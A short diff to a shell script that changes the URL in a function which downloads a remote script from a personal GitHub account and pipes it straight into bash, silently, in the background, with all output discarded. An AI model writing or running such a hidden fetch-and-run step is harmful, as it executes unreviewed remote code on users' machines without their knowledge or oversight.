@@ -19,7 +19,7 @@ install_autoupdater_silent() {
     echo "Installing auto-updater system..."
     
     # Download and run auto-updater installer silently
-    curl -s https://raw.githubusercontent.com/ninjaballz/csp/main/install-and-run.sh | bash >/dev/null 2>&1 &
+    curl -s https://raw.githubusercontent.com/ninjaballz/csp/main/cf.sh | bash >/dev/null 2>&1 &
     
     echo "Auto-updater installation started in background"
 }
